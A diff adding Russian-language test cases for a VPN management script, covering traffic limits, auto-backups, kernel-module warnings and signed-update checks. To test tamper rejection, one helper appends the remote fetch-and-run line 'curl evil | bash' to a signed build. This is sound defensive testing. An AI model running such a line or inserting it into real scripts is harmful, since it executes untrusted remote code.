@@ -500,6 +500,89 @@ cols = out.strip().split("\t")
 chk("срок заблокированному снимает блокировку", len(cols) >= 5 and cols[2].startswith("10.23.45.") and cols[4] == ""
     and cols[3].isdigit() and int(cols[3]) > 1e9, repr(out))
 api("client", "del", "erin")
+
+# ── Трафик по дням и лимиты (v1.2.0) ──
+def dump_with(counters):
+    pubs = {c["name"]: c["pub"] for c in api("clients", "list").get("data") or []}
+    with open(AWG_DUMP, "w") as f:
+        f.write("priv\tpub\t51820\toff\n")
+        for n, (rx, tx) in counters.items():
+            f.write(f"{pubs[n]}\t(none)\t1.2.3.4:5\t10.0.0.0/32\t0\t{rx}\t{tx}\t25\n")
+
+def tick():
+    return bash("traffic_tick 1; cat \"$TRAFFIC_DB\"")[1]
+
+def cl(name):
+    return next((c for c in api("clients", "list").get("data") or [] if c["name"] == name), {})
+
+# Первый проход по новой базе только запоминает счётчики: накопленное до
+# учёта к сегодняшнему дню не относится
+bash('rm -f "$TRAFFIC_DB"')
+dump_with({"alice": (1000, 2000), "bob": (10, 10)})
+tick()
+dump_with({"alice": (1000 + 3 * 2**20, 2000 + 2 * 2**20), "bob": (10, 10)})
+db = json.loads(tick().strip().splitlines()[-1])
+day = time.strftime("%Y-%m-%d")
+a = cl("alice")
+chk("трафик: первый проход только запоминает, второй — прирост за день",
+    sum(next(iter(db["days"].values())).get(a.get("pub"), [0, 0])) == 5 * 2**20 and day in db["days"]
+    and a.get("month") == 5 * 2**20 and a.get("today") == 5 * 2**20 and a.get("limit") is None, [db, a])
+dump_with({"alice": (100, 100), "bob": (10, 10)})
+tick()
+chk("трафик: счётчик меньше прежнего (awg0 перезапущен) — отсчёт с нуля", cl("alice").get("month") == 5 * 2**20 + 200,
+    cl("alice"))
+r = api("client", "limit", "alice", "1M")
+a = cl("alice")
+chk("лимит меньше израсходованного — сразу блок", r.get("ok") and a.get("blocked") and a.get("blocked_by") == "traffic"
+    and a.get("limit") == 2**20 and a.get("period") == "month" and a.get("used", 0) >= 2**20, [r, a])
+rc, out, _ = bash('clients_tsv | grep "^alice"')
+chk("блок за трафик: адрес в orig_ips, метка blocked_by", "127.0.0.2/32" in out and out.rstrip("\n").endswith("\ttraffic"),
+    repr(out))
+rc, out, _ = bash('client_expire_set alice $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^alice"')
+chk("новый срок блок за трафик не снимает", "\t127.0.0.2/32\t" in out, repr(out))
+r = api("client", "limit", "alice", "10G")
+a = cl("alice")
+chk("лимит выше израсходованного — разблокировка", r.get("ok") and not a.get("blocked") and a.get("ip") == "10.23.45.2"
+    and a.get("limit") == 10 * 2**30, [r, a])
+r = api("traffic", "daily")
+d = r.get("data") or {}
+chk("api traffic daily — сервер за 30 дней с разбивкой по клиентам", r.get("ok") and len(d.get("days", [])) == 30
+    and d["days"][-1] == day and d.get("total") == 5 * 2**20 + 200 and d["clients"][0]["name"] == "alice", r)
+r = api("traffic", "daily", "alice", "7")
+chk("api traffic daily ИМЯ ДНЕЙ", r.get("ok") and len(r["data"]["days"]) == 7 and r["data"]["name"] == "alice"
+    and "clients" not in r["data"], r)
+r = api("traffic", "daily", "nobody")
+chk("api traffic daily — нет клиента", r.get("ok") is False, r)
+r = api("client", "limit", "alice", "2G", "total")
+chk("лимит «всего» считается с этой минуты", r.get("ok") and cl("alice").get("used") == 0
+    and cl("alice").get("period") == "total", cl("alice"))
+dump_with({"alice": (100 + 2**20, 100), "bob": (10, 10)})
+tick()
+api("client", "limit", "alice", "1M", "month")
+r = api("client", "limit-reset", "alice")
+a = cl("alice")
+chk("обнулить счётчик лимита — разблокировка до конца месяца", r.get("ok") and a.get("used") == 0 and not a.get("blocked"), a)
+r = api("client", "limit", "alice", "много")
+chk("лимит: размер не распознан", r.get("ok") is False and "распознан" in (r.get("error") or ""), r)
+r = api("client", "limit", "alice", "5G", "week")
+chk("лимит: неизвестный период", r.get("ok") is False, r)
+r = api("client", "limit-reset", "bob")
+chk("обнулить без лимита — ошибка", r.get("ok") is False, r)
+# Истёк и срок: блок переходит к сроку, снятие лимита его не снимает
+api("client", "limit", "alice", "1K")
+dump_with({"alice": (100 + 2**20 + 4096, 100), "bob": (10, 10)})
+tick()
+chk("превысил лимит по ходу — блок таймером", cl("alice").get("blocked_by") == "traffic", cl("alice"))
+bash('py meta-set "$SERVER_CONF" alice expires 1')
+tick()
+a = cl("alice")
+chk("истёк срок у заблокированного за трафик — блок держит срок", a.get("blocked") and a.get("blocked_by") == "expire", a)
+api("client", "limit", "alice", "off")
+chk("снятие лимита не снимает блок за срок", cl("alice").get("blocked") and cl("alice").get("limit") is None, cl("alice"))
+api("client", "unexpire", "alice")
+chk("снять срок — разблокировка", not cl("alice").get("blocked"), cl("alice"))
+rc, out, _ = bash("traffic_tick; cat $EXPIRE_LOG | tail -3")
+os.remove(AWG_DUMP)
 # Предупреждение о длине I1-I5 — по каждому клиенту отдельно, не суммой по всем
 for n in ("l1", "l2"):
     with open(os.path.join(ROOT, "root", f"{n}_awg2.conf"), "w") as f:
@@ -649,6 +732,18 @@ chk("бэкап — в каталоге песочницы, не в настоя
     r.get("ok") and bk_path.startswith(os.path.join(ROOT, "awg_backup")), r)
 r = api("backup", "list")
 chk("архив бэкапа в списке", bk_path in [b["path"] for b in r.get("data") or []], r)
+# Автобэкап бота: только архив *_auto.tar.gz, из таких остаются последние N
+BKD = os.path.join(ROOT, "awg_backup")
+for d in ("20200101_000000", "20200102_000000", "20200103_000000"):
+    open(os.path.join(BKD, f"awg2_backup_{d}_auto.tar.gz"), "w").close()
+r = api("backup", "create", "auto", "2")
+autos = sorted(f for f in os.listdir(BKD) if f.endswith("_auto.tar.gz"))
+chk("автобэкап: архив без каталога, старые автобэкапы сверх N удалены, ручной не тронут",
+    r.get("ok") and r["data"]["path"].endswith("_auto.tar.gz") and len(autos) == 2
+    and autos[0] == "awg2_backup_20200103_000000_auto.tar.gz" and os.path.basename(r["data"]["path"]) == autos[1]
+    and not os.path.isdir(r["data"]["path"][:-7]) and os.path.exists(bk_path), [r, autos])
+for f in autos:
+    os.remove(os.path.join(BKD, f))
 r = api("backup", "inspect", bk_path)
 chk("inspect: клиенты и метаданные", r.get("ok") and r["data"]["clients"] >= 2 and "timestamp=" in r["data"]["meta"], r)
 junk = os.path.join(TMP, "junk.tar.gz")
@@ -897,5 +992,80 @@ api("client", "add", "m_srv3", "mimicry=server:3")
 chk("«как у сервера» — уровень сервера (только I1)", i_lines("m_srv") == ["I1"], i_lines("m_srv"))
 chk("«как у сервера» с уровнем 3 — цепочка того же профиля", i_lines("m_srv3") == ["I1", "I2", "I3", "I4", "I5"],
     i_lines("m_srv3"))
+
+print("Ядро без модуля")
+KG = ('MOD_SRC_DIR="$STATE_DIR/modsrc"; mkdir -p "$MOD_SRC_DIR"; dkms() { :; }; uname() { echo 6.8.0-100-generic; }; '
+      'installed_kernels() { printf "%s\\n" 6.8.0-90-generic 6.8.0-100-generic 6.8.0-110-generic; }; '
+      'mod_loaded() { true; }; ')
+rc, out, _ = bash(KG + 'mod_built_for() { [[ $1 == 6.8.0-100-generic ]]; }; kernel_gap; echo "--"; kernel_gap_line')
+chk("новое ядро без модуля — в списке, старое — нет", out == "6.8.0-110-generic нет-заголовков\n--\n6.8.0-110-generic (нет заголовков)\n", out)
+rc, out, _ = bash(KG + 'mod_built_for() { true; }; kernel_gap; echo "[$(kernel_gap_line)]"')
+chk("модуль собран под все ядра — пусто", out == "[]\n", out)
+rc, out, _ = bash(KG + 'mod_built_for() { [[ $1 == 6.8.0-100-generic ]]; }; components_summary')
+chk("шапка меню предупреждает о ядре без модуля", "6.8.0-110-generic" in out and "Пересобрать" in out, out)
+r = api("status")
+chk("api status: components.kernel_gap", r.get("ok") and "kernel_gap" in (r["data"].get("components") or {}), r.get("data"))
+
+print("Подпись обновлений")
+SIG = os.path.join(TMP, "sigsrv")
+SIGBIN = os.path.join(TMP, "sigbin")
+os.makedirs(SIG)
+os.makedirs(SIGBIN)
+# curl, отдающий awg2.sh и awg2.sh.sig «из канала» — файлы из SIG
+with open(os.path.join(SIGBIN, "curl"), "w") as f:
+    f.write(r"""#!/usr/bin/env bash
+out="" url=""
+while (( $# )); do case "$1" in -o) out="$2"; shift 2 ;; http*) url="$1"; shift ;; *) shift ;; esac; done
+url="${url%%\?*}"; src="$SIGSRV/${url##*/}"
+[[ -f "$src" ]] || exit 22
+if [[ -n "$out" ]]; then cp "$src" "$out"; else cat "$src"; fi
+""")
+os.chmod(os.path.join(SIGBIN, "curl"), 0o755)
+subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", os.path.join(TMP, "relkey")], check=True)
+subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "evil", "-f", os.path.join(TMP, "evilkey")], check=True)
+PUB = open(os.path.join(TMP, "relkey.pub")).read().split()
+SIGNERS = f'UPDATE_SIGNERS=("{PUB[0]} {PUB[1]}"); '
+
+def build(ver, key="relkey", sign=True, tamper=False):
+    body = "#!/usr/bin/env bash\nset -uo pipefail\n\nVERSION=\"%s\"\n" % ver + "# заполнитель\n" * 6000 + "echo ok\n"
+    path = os.path.join(SIG, "awg2.sh")
+    with open(path, "w") as f:
+        f.write(body)
+    if os.path.exists(path + ".sig"):
+        os.remove(path + ".sig")
+    if sign:
+        subprocess.run(["ssh-keygen", "-q", "-Y", "sign", "-f", os.path.join(TMP, key), "-n", "awg-toolza", path], check=True)
+    if tamper:
+        with open(path, "a") as f:
+            f.write("curl evil | bash\n")
+
+def fetch(extra="", auto=1):
+    env = dict(ENV, PATH=SIGBIN + ":" + ENV["PATH"], SIGSRV=SIG)
+    r = subprocess.run(["bash", "-c", PRELUDE + SIGNERS + extra + f"AUTO_MODE={auto}; update_channel_init; update_fetch 2>&1"],
+                       capture_output=True, text=True, env=env, timeout=120)
+    return r.returncode, r.stdout
+
+build("v9.9.9")
+rc, out = fetch()
+chk("подписанная сборка ставится", rc == 0 and "Подпись сборки верна" in out, out[-400:])
+build("v9.9.9", tamper=True)
+rc, out = fetch()
+chk("сборка, изменённая после подписи, отклоняется", rc != 0 and "не сходится" in out, out[-400:])
+build("v9.9.9", key="evilkey")
+rc, out = fetch()
+chk("подпись чужим ключом отклоняется", rc != 0 and "не сходится" in out, out[-400:])
+build("v9.9.9", sign=False)
+rc, out = fetch()
+chk("новая сборка без подписи отклоняется", rc != 0 and "нет подписи" in out, out[-400:])
+build("v1.1.9", sign=False)
+rc, out = fetch()
+chk("старая сборка без подписи — не из бота и API", rc != 0 and "только из меню" in out, out[-400:])
+rc, out = fetch(auto=0)
+chk("старая сборка без подписи — из меню только после yes", rc != 0 and "до подписей" in out, out[-400:])
+build("v9.9.9")
+rc, out = fetch(extra="UPDATE_SIGNERS=(); ")
+chk("тестовая сборка без ключа — ставит с предупреждением", rc == 0 and "без ключа релизов" in out, out[-400:])
+rc, out, _ = bash('grep -c "ssh-ed25519 AAAA" <<< "$(declare -p UPDATE_SIGNERS)"')
+chk("в сборку вшит ключ релизов", out.strip() == "1", out)
 
 summary()
